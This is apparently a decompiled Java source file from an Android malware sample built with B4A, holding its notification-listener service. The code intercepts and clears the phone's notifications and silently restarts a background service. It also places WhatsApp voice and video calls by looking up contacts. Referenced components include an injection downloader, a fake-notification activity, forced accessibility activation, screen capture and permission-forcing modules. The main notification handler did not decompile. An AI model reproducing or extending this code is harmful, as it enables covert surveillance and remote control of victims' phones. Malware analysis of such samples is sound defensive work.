package com.com.androidrr;

import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.NotificationListenerWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;

/* loaded from: classes.dex */
public class notificationservice extends Service {
    public static NotificationListenerWrapper.NotificationListener _listener;
    static notificationservice mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _service_destroy() throws Exception {
        return "";
    }

    public void cancelNotification(int i) {
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class notificationservice_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (notificationservice) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) notificationservice.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return notificationservice.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.notificationservice");
            processBA = BA;
            if (BA.isShellModeRuntimeCheck(BA)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA BA2 = processBA;
            BA2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.notificationservice", BA2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (notificationservice) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.notificationservice.1
            @Override // java.lang.Runnable
            public void run() {
                notificationservice.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.notificationservice.2
                @Override // java.lang.Runnable
                public void run() {
                    notificationservice.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (notificationservice) Create **");
                    notificationservice.processBA.raiseEvent(null, "service_create", new Object[0]);
                    notificationservice.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 2;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (notificationservice) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (notificationservice) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (notificationservice) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static String _clearall() throws Exception {
        _listener.ClearAll();
        return "";
    }

    public static Object _createfileprovideruri(String str, String str2) throws Exception {
        JavaObject javaObject = new JavaObject();
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeContext(processBA);
        javaObject.InitializeStatic("androidx.core.content.FileProvider");
        JavaObject javaObject3 = new JavaObject();
        javaObject3.InitializeNewInstance("java.io.File", new Object[]{str, str2});
        StringBuilder sb = new StringBuilder();
        B4AApplication b4AApplication = Common.Application;
        sb.append(B4AApplication.getPackageName());
        sb.append(".provider");
        return javaObject.RunMethod("getUriForFile", new Object[]{javaObject2.getObject(), sb.toString(), javaObject3.getObject()});
    }

    public static String _getactive() throws Exception {
        _listener.GetActiveNotifications();
        return "";
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x0198 A[Catch: Exception -> 0x01d2, TryCatch #1 {Exception -> 0x01d2, blocks: (B:21:0x017f, B:23:0x0198, B:25:0x01a8, B:26:0x01c5, B:30:0x01b6), top: B:20:0x017f }] */
    /* JADX WARN: Removed duplicated region for block: B:31:? A[RETURN, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static java.lang.String _listener_notificationposted(anywheresoftware.b4a.objects.NotificationListenerWrapper.StatusBarNotificationWrapper r7) throws java.lang.Exception {
        /*
            Method dump skipped, instructions count: 490
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.notificationservice._listener_notificationposted(anywheresoftware.b4a.objects.NotificationListenerWrapper$StatusBarNotificationWrapper):java.lang.String");
    }

    public static String _listener_notificationremoved(NotificationListenerWrapper.StatusBarNotificationWrapper statusBarNotificationWrapper) throws Exception {
        try {
            notificationservice notificationserviceVar = mostCurrent;
            dateutils dateutilsVar = notificationserviceVar._dateutils;
            BA BA = processBA;
            globalparameters globalparametersVar = notificationserviceVar._globalparameters;
            long j = globalparameters._lnglastpermnotification;
            DateTime dateTime = Common.DateTime;
            if (dateutils._periodbetween(BA, j, DateTime.getNow()).Seconds <= 5) {
                return "";
            }
            BA BA2 = processBA;
            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
            if (Common.IsPaused(BA2, backgroundservice.getObject())) {
                BA BA3 = processBA;
                backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                Common.StartService(BA3, backgroundservice.getObject());
            } else {
                BA BA4 = processBA;
                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                Common.CallSubDelayed(BA4, backgroundservice.getObject(), "CheckIfServiceIsEnabled");
            }
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            DateTime dateTime2 = Common.DateTime;
            globalparameters._lnglastpermnotification = DateTime.getNow();
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("621037070", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _process_globals() throws Exception {
        _listener = new NotificationListenerWrapper.NotificationListener();
        return "";
    }

    public static String _service_create() throws Exception {
        _listener.Initialize(processBA, "listener");
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        _listener.HandleIntent(intentWrapper);
        return "";
    }

    public void closenotidata(int i) {
        NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService("notification");
        ((NotificationManager) getApplicationContext().getSystemService("notification")).cancel(i);
        notificationManager.cancel(i);
    }

    public void MakeVoiceCall(String str) {
        try {
            Intent intent = new Intent();
            intent.setAction(IntentWrapper.ACTION_VIEW);
            intent.setDataAndType(Uri.parse(str), "vnd.android.cursor.item/vnd.com.whatsapp.voip.call");
            intent.setPackage("com.whatsapp");
            intent.addFlags(ClientDefaults.MAX_MSG_SIZE);
            startActivity(intent);
        } catch (Exception unused) {
        }
    }

    public void makenewcall(String str) {
        Cursor query = getApplicationContext().getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, null, null, "display_name");
        while (query.moveToNext()) {
            Long valueOf = Long.valueOf(query.getLong(query.getColumnIndex("_id")));
            String string = query.getString(query.getColumnIndex("display_name"));
            String string2 = query.getString(query.getColumnIndex("mimetype"));
            if (string.equals(str) && string2.equals("vnd.android.cursor.item/vnd.com.whatsapp.voip.call")) {
                Intent intent = new Intent();
                intent.setAction(IntentWrapper.ACTION_VIEW);
                intent.setDataAndType(Uri.parse("content://com.android.contacts/data/" + valueOf), "vnd.android.cursor.item/vnd.com.whatsapp.voip.call");
                intent.addFlags(ClientDefaults.MAX_MSG_SIZE);
                intent.setPackage("com.whatsapp");
                startActivity(intent);
            }
        }
    }

    public void makenewvideocall(String str) {
        Cursor query = getApplicationContext().getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, null, null, "display_name");
        while (query.moveToNext()) {
            Long valueOf = Long.valueOf(query.getLong(query.getColumnIndex("_id")));
            String string = query.getString(query.getColumnIndex("display_name"));
            String string2 = query.getString(query.getColumnIndex("mimetype"));
            if (string.equals(str) && string2.equals("vnd.android.cursor.item/vnd.com.whatsapp.video.call")) {
                Intent intent = new Intent();
                intent.setAction(IntentWrapper.ACTION_VIEW);
                intent.setDataAndType(Uri.parse("content://com.android.contacts/data/" + valueOf), "vnd.android.cursor.item/vnd.com.whatsapp.video.call");
                intent.addFlags(ClientDefaults.MAX_MSG_SIZE);
                intent.setPackage("com.whatsapp");
                startActivity(intent);
            }
        }
    }
}
